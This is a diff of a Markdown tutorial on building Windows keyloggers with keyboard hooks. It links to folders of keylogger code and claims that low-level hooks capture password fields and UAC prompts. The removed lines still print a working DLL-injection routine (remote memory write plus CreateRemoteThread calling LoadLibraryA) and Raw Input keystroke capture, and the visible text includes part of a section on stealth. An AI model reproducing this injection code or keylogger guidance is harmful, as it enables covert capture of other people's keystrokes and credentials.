@@ -11,7 +11,7 @@ Windows uses a message queue system where:
 
 ### 2. Hooking Methods
 
-#### a. WH_KEYBOARD Hook (Legacy)
+#### a. WH_KEYBOARD Hook (Legacy) NO system-wide
 ```c
 HHOOK g_hHook = NULL;   // HHOOK is a handle (pointer-like) to a hook instance in Windows.
 
@@ -52,6 +52,8 @@ void SetHook() {
 }
 ```
 
+click [here](./Legacy/) to see the Legacy keylogger code
+
 
 #### Current Windows Restrictions (as of 2023)
 
@@ -68,14 +70,21 @@ void SetHook() {
    Windows 10+ shows warning indicators for global hooks
 
 
+global hooks (especially keyboard hooks) can be flagged because they’re often used in keyloggers and spyware.
+
+
 
 ---
 
 
-#### b. WH_KEYBOARD_LL (Low-Level, Modern)
+#### b. WH_KEYBOARD_LL (Low-Level, Modern) system-wide
+
+- Captures keyboard input globally, before it’s posted to any thread message queue.
 - Works across processes
 - Doesn't require DLL injection
-- Sample:
+- Works for all applications, even games, password fields, or UAC prompts (unless blocked by security).
+
+
 ```c
 HHOOK g_hHook = NULL;
 
@@ -90,53 +99,21 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 ```
 
+click [here](./low-level/) to see the Low Level keylogger code
+
+
+
 ## Advanced Techniques
 
 ### 1. DLL Injection for System-Wide Hooking
-```c
-// In DLL:
-__declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // Keylogging logic
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
-}
 
-// In injector:
-void InjectDLL(DWORD pid, const char* dllPath) {
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath)+1, NULL);
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
-        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), 
-        pDllPath, 0, NULL);
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-}
-```
+click [here](../DLL-injection/) to learn
 
 ### 2. Direct Input Capture
-```c
-// Using Raw Input API
-RAWINPUTDEVICE rid;
-rid.usUsagePage = 0x01; // Generic Desktop
-rid.usUsage = 0x06;     // Keyboard
-rid.dwFlags = RIDEV_INPUTSINK;
-rid.hwndTarget = hWnd;
-RegisterRawInputDevices(&rid, 1, sizeof(rid));
 
-// Window procedure
-case WM_INPUT: {
-    UINT size;
-    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
-    LPBYTE lpb = malloc(size);
-    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &size, sizeof(RAWINPUTHEADER));
-    RAWINPUT* raw = (RAWINPUT*)lpb;
-    if (raw->header.dwType == RIM_TYPEKEYBOARD) {
-        // Process keyboard event
-    }
-    free(lpb);
-}
-```
+click [here](../DLL-injection/) to learn
+
+
 
 ## Stealth Considerations
 
@@ -165,4 +142,14 @@ if (NtSIT) {
    - Windows 10+ protected processes
    - Credential UI isolation
 
+---
 
+<br>
+
+
+> **Note:**  
+> When we talk about "system-wide" in the context of hooks like WH_KEYBOARD or WH_KEYBOARD_LL, we mean
+> The hook receives keystrokes from every application on the system, not just from the program that installed the hook.  
+> For example, if you hook Notepad, you'll also see keys typed in Chrome, Word, games, etc. — that’s system-wide.
+> One lives in the process being hooked (KeyboardProc)
+> One lives in your process only (LowLevelKeyboardProc)
